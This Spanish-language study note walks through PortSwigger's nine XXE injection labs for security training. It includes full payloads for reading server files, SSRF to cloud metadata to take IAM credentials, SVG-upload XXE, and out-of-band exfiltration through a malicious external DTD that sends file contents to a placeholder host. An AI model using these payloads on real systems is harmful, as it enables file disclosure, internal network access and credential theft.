---
aliases:
  - XXE labs
  - xxe-labs
tags:
  - vuln/xxe
  - labs
  - portswigger
---

# XXE — Labs de PortSwigger

Labs de la categoría **[XML external entity (XXE) injection](https://portswigger.net/web-security/xxe)**: **2 Apprentice + 6 Practitioner + 1 Expert** (9 en total). **El hilo común:** la app **parsea XML que vos controlás** (o construye un documento a partir de tu input) y su **parser XML** resuelve un `<!DOCTYPE>`/entidad que vos inyectás → le hacés **leer archivos locales**, **pegarle a URLs internas (SSRF)** o **exfiltrar out-of-band**. Lo que cambia lab a lab: **qué feature te da el XML** y **cómo sacás los datos** (in-band reflejado vs. blind OOB/error-based).

> [!note] Sobre "lenguaje / librería de templates"
> Eso es un fingerprint de **[[vulnerabilities/009-server-side-template-injection/README|SSTI]]** (Jinja2, Twig, Freemarker…), **no** de XXE. XXE no depende de un motor de templates, sino del **parser XML** y de **qué features tiene habilitadas**: resolución de **DTDs**, **entidades externas** (generales / de parámetro `%`), **XInclude**, y —solo en un lab— la presencia de un **DTD local** en el disco del server. Ese es el "detalle de estilo" que distingue cada lab, y va en la columna **Técnica · qué necesitás**.

> **Cómo leer las columnas:** **Feature vulnerable** = por dónde entra el XML (dónde inyectás) · **Técnica · qué necesitás** = el truco del parser + herramientas externas (Collaborator / exploit server / DTD local) · **Objetivo** = qué conseguís. Payloads completos → sección [Payloads por lab](#payloads-por-lab). Metodología y detección → [[vulnerabilities/006-xxe/xxe|entry point]] · fundamentos → [[how-to-work/xml|how-to-work/xml]].

## Apprentice

| # | Laboratorio | Feature vulnerable (entry point) | Técnica · qué necesitás | Objetivo |
| --- | --- | --- | --- | --- |
| 1 | [Exploiting XXE using external entities to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files) | **"Check stock"** manda XML con `<productId>` | **In-band clásico:** definís una entidad externa `SYSTEM "file:///…"` y la referenciás donde se refleja `productId`. Nada externo. | Leer **`/etc/passwd`** (vuelve reflejado en el error/respuesta). |
| 2 | [Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf) | **"Check stock"** (mismo XML) | **XXE → SSRF:** la entidad apunta a una **URL interna** (metadata de la nube) en vez de a un archivo. In-band. | Pegarle a **`http://169.254.169.254/…`** y **exfiltrar la IAM secret key** del rol EC2. |

## Practitioner

| # | Laboratorio | Feature vulnerable (entry point) | Técnica · qué necesitás | Objetivo |
| --- | --- | --- | --- | --- |
| 3 | [Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack) | `productId` que el server **mete en un XML del lado servidor** (vos **no** controlás el documento entero → no podés poner `<!DOCTYPE>`) | **XInclude:** como no controlás el doc, inyectás un `<xi:include>` en el valor que sí controlás. No hace falta DOCTYPE. | Leer **`/etc/passwd`** vía `xi:include parse="text"`. |
| 4 | [Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload) | **Subida de imagen** (avatar del comentario) que procesa **SVG** (¡es XML!) | **XXE en SVG:** subís un `.svg` con `<!DOCTYPE>`+entidad; el server lo renderiza y devuelve el texto. → PoC ya en el repo: [[vulnerabilities/006-xxe/bitso.0whvrzxl.oti8.svg\|bitso…svg]] | Leer **`/etc/hostname`** (aparece en la imagen/comentario renderizado). |
| 5 | [Blind XXE with out-of-band interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction) | **"Check stock"** pero la respuesta **no refleja** nada (blind) | **OOB con Collaborator:** entidad `SYSTEM "http://COLLAB"`. Si el parser **bloquea entidades generales externas**, pasás a **entidad de parámetro** `%`. Necesitás **Burp Collaborator**. | Provocar una **interacción DNS/HTTP** hacia tu Collaborator (probar que hay XXE ciego). |
| 6 | [Blind XXE with out-of-band interaction via XML parameter entities](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities) | **"Check stock"** con entidades **generales filtradas** | **Entidades de parámetro (`%`):** cuando el WAF/parser filtra entidades normales, usás `<!ENTITY % xxe SYSTEM "http://COLLAB"> %xxe;`. Necesitás **Collaborator**. | Interacción **OOB** hacia el Collaborator. |
| 7 | [Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration) | **"Check stock"** blind | **DTD externa maliciosa:** subís un `.dtd` al **exploit server** que encadena entidades de parámetro y **exfiltra el contenido del archivo en la URL** de salida. Necesitás **exploit server** (+ Collaborator opcional). | Exfiltrar **`/etc/hostname`** vía la query string de tu server. |
| 8 | [Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages) | **"Check stock"** blind, pero el parser **filtra errores verbosos** | **Error-based con DTD externa:** la DTD fuerza un `SYSTEM "file:///invalid/CONTENIDO"` → el **mensaje de error** incluye el contenido del archivo. Necesitás **exploit server**. | Leer **`/etc/passwd`** dentro de un **parse error**. |

## Expert

| # | Laboratorio | Feature vulnerable (entry point) | Técnica · qué necesitás | Objetivo |
| --- | --- | --- | --- | --- |
| 9 | [Exploiting XXE to retrieve data by repurposing a local DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd) | **"Check stock"** blind **sin salida a internet** (no podés cargar DTD externa) | **Reutilizar un DTD local:** cargás un DTD que **ya existe en el disco** del server (GNOME **`yelp`** → `/usr/share/yelp/dtd/docbookx.dtd`) y **redefinís una de sus entidades** (`ISOamso`) para meter el ataque error-based. **No** necesitás server externo. | Leer **`/etc/passwd`** vía error, **todo local**. |

---

## Payloads por lab

> Reemplazá `LAB`, `COLLAB` (subdominio Collaborator) y `EXPLOIT` (tu exploit server). En labs de "Check stock" el payload va **reemplazando el body XML** de la request `POST /product/stock`.

**L1 — Leer archivo (in-band):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

**L2 — SSRF a metadata de la nube:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<!-- referenciás &xxe; en productId; después vas navegando la ruta: -->
<!-- http://169.254.169.254/latest/meta-data/iam/security-credentials/admin -->
```

**L3 — XInclude (no controlás el doc entero):**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
> Va **en el valor** del parámetro `productId` (no como body completo, porque el server arma el XML).

**L4 — XXE vía SVG (upload de imagen):** ya está en el repo → [[vulnerabilities/006-xxe/bitso.0whvrzxl.oti8.svg|bitso…svg]]
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg xmlns="http://www.w3.org/2000/svg" width="128" height="128">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**L5 — Blind OOB (entidad general; si la filtran → L6):**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://COLLAB"> ]>
<!-- &xxe; en productId -->
```

**L6 — Blind OOB con entidad de parámetro:**
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://COLLAB"> %xxe; ]>
```

**L7 — Exfiltración con DTD externa maliciosa.** En la request:
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://EXPLOIT/exploit.dtd"> %xxe;]>
```
`exploit.dtd` en el exploit server:
```dtd
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLAB/?x=%file;'>">
%eval;
%exfil;
```

**L8 — Error-based con DTD externa.** Misma stub en la request; `exploit.dtd`:
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```
> El archivo `/invalid/CONTENIDO-DE-PASSWD` no existe → el **mensaje de error** filtra el contenido.

**L9 — Repurposing local DTD (todo local, sin salida a internet):**
```xml
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
  <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
  &#x25;eval;
  &#x25;error;
'>
%local_dtd;
]>
```

---

## Atajos mentales / patrones

- **La pista de que hay XML:** cualquier request cuyo body sea `<xml…>` (típico **"Check stock"** `POST /product/stock`), o cualquier feature que coma **XML/SVG/DOCX/SOAP**. Si ves XML → probá inyectar `<!DOCTYPE>`.
- **In-band vs blind:** si la respuesta **refleja** el valor (productId inválido vuelve en el error) → in-band (L1-L4). Si **no refleja nada** → blind: **OOB** (Collaborator) o **error-based**.
- **Si filtran entidades generales externas** (`<!ENTITY xxe SYSTEM…>` no dispara) → **entidades de parámetro** `%` (L6). Es el escalón siguiente casi siempre.
- **No podés poner `<!DOCTYPE>`** (solo controlás un valor dentro de un XML del server) → **XInclude** (L3).
- **Blind + querés el *contenido* del archivo** (no solo un ping) → **DTD externa** en tu exploit server que exfiltra por **URL** (L7) o por **mensaje de error** (L8).
- **Blind sin salida a internet** (no carga DTD externa) → **reutilizar un DTD local** ya presente (`yelp/docbookx.dtd`) y redefinir una entidad suya (L9). El más difícil (Expert).
- **XXE → SSRF:** apuntá la entidad a `http://169.254.169.254/` (metadata AWS) u otras URLs internas (L2). XXE es un vector clásico de [[vulnerabilities/007-ssrf/README|SSRF]].
- **Upload de imagen = superficie XXE:** SVG es XML; muchos procesadores de imágenes/documentos parsean XML (SVG, DOCX/XLSX, formatos de oficina) → [[vulnerabilities/017-file-upload-vulnerabilities/README|file upload]].
- **Objetivos típicos:** leer `/etc/passwd` o `/etc/hostname`, robar credenciales cloud vía SSRF, o simplemente probar interacción OOB.

> [!note] Ver también
> - **Entry point** (detección, árbol de decisión, plantillas) → [[vulnerabilities/006-xxe/xxe|xxe]]
> - **Fundamentos** (qué es XML/DTD/entidades) → [[how-to-work/xml|how-to-work/xml]]
> - **Escalera del XXE ciego** (exfil/error/DTD externa/local + diagrama) → [[vulnerabilities/006-xxe/xxe#🪜 Escalera del XXE ciego (blind)|entry point]]
> - **Ejemplos / PoCs completas** (una por vector, con request + `Content-Type` + DTD) → carpeta [[vulnerabilities/006-xxe/examples/xxe-ciego-exfiltrar-con-dtd-externo|examples/]]
